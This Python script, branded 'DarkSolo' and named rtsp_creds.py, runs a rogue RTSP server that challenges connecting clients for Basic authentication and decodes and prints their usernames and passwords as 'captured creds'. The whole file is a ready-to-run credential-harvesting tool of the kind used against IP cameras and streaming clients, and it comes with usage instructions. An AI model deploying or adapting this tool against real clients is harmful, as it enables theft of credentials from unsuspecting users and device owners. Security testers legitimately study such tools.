import socket
import base64
import argparse
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

# Default RTSP port
DEFAULT_RTSP_PORT = 554

# Function to print the banner
def print_banner():
    banner = """                                          
 _____ _____ _____ _____    _____           _     
| __  |_   _|   __|  _  |  |     |___ ___ _| |___ 
|    -| | | |__   |   __|  |   --|  _| -_| . |_ -|
|__|__| |_| |_____|__|     |_____|_| |___|___|___|                                                  
                                        DarkSolo
        """
    print(banner)

# Function to print the help message
def print_help():
    help_message = f"""
    {Fore.YELLOW}Usage:
        python rtsp_creds.py [--port PORT]

    Options:
        --port    Specify the port number to listen on (default: 554).
                  If not provided, the server will use the default port 554.

    Example:
        python rtsp_creds.py --port 8080

    Description:
        This script implements a basic RTSP server that listens for incoming client requests and capture basic auth creds.
    {Style.RESET_ALL}
    """
    print(help_message)

# Argument parsing
parser = argparse.ArgumentParser(description="RTSP Server")
parser.add_argument(
    "--port", type=int, default=DEFAULT_RTSP_PORT, help="Port number to listen on (default: 554)"
)
args = parser.parse_args()
RTSP_PORT = args.port

# Create a socket for the RTSP server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', RTSP_PORT))
server_socket.listen(5)

# Print the banner and start message
print_banner()
print(f"{Fore.GREEN}RTSP Server Listening on port {RTSP_PORT}\n")

# Authentication data (username:password)
USERNAME = "user"
PASSWORD = "pass"

def handle_client(client_socket, client_address):
    print(f"{Fore.BLUE}[+] Connection established from {client_address}")

    try:
        while True:
            # Receive data from the client (max 1024 bytes at a time)
            request = client_socket.recv(1024)
            if not request:
                break

            # Decode the request and print it to the terminal
            request_str = request.decode('utf-8')
            print(f"\n{Fore.YELLOW}[+] Request:\n{request_str}")

            # Check if the header contains "Authorization"
            if "Authorization" in request_str:
                # Extract the credentials
                auth_header = [line for line in request_str.split('\r\n') if "Authorization" in line][0]
                encoded_credentials = auth_header.split(' ')[2]  # "Basic <encoded_credentials>"
                decoded_credentials = base64.b64decode(encoded_credentials).decode('utf-8')

                # Print the decoded credentials in ASCII
                print(f"{Fore.RED}[!][!] Captured creds: [!][!]\n\n {decoded_credentials} ")

                # Verify if the credentials are correct
                if decoded_credentials == f"{USERNAME}:{PASSWORD}":
                    # Handle the DESCRIBE request (authenticated)
                    if 'DESCRIBE' in request_str:
                        sdp_response = (
                            "v=0\r\n"
                            "o=- 1601829485697 1 IN IP4 0.0.0.0\r\n"
                            "s=RTSP Server\r\n"
                            "c=IN IP4 0.0.0.0\r\n"
                            "t=0 0\r\n"
                            "a=control:*\r\n"
                            "m=video 0 RTP/AVP 96\r\n"
                            "a=rtpmap:96 H264/90000\r\n"
                            "a=framerate:8.0\r\n"
                            "a=control:trackID=1\r\n"
                        )

                        # Valid RTSP response
                        response = (
                            "RTSP/1.0 200 OK\r\n"
                            "CSeq: 1\r\n"
                            "Content-Base: rtsp://0.0.0.0:554/\r\n"
                            "Content-Type: application/sdp\r\n"
                            f"Content-Length: {len(sdp_response)}\r\n\r\n"
                            f"{sdp_response}"
                        )
                        client_socket.send(response.encode('utf-8'))
                    else:
                        # Generic response
                        response = "RTSP/1.0 501 Not Implemented\r\n\r\n"
                        client_socket.send(response.encode('utf-8'))
                else:
                    # If the credentials are wrong, respond with Unauthorized
                    response = (
                        "RTSP/1.0 401 Unauthorized\r\n"
                        "CSeq: 1\r\n"
                        "WWW-Authenticate: Basic realm=\"RTSP Server\"\r\n\r\n"
                    )
                    client_socket.send(response.encode('utf-8'))
            else:
                # If there is no Authorization header, respond with 401 Unauthorized
                response = (
                    "RTSP/1.0 401 Unauthorized\r\n"
                    "CSeq: 1\r\n"
                    "WWW-Authenticate: Basic realm=\"RTSP Server\"\r\n\r\n"
                )
                client_socket.send(response.encode('utf-8'))

    except Exception as e:
        print(f"{Fore.RED}Error occurred: {e}")
    finally:
        # Close the connection with the client
        client_socket.close()
        print(f"{Fore.BLUE}\nConnection closed with {client_address}\nExiting...")
        exit()

# Main server loop
try:
    while True:
        # Accept new connections
        client_socket, client_address = server_socket.accept()
        handle_client(client_socket, client_address)
except KeyboardInterrupt:
    print(f"{Fore.RED}Interrupted by user.")
finally:
    server_socket.close()
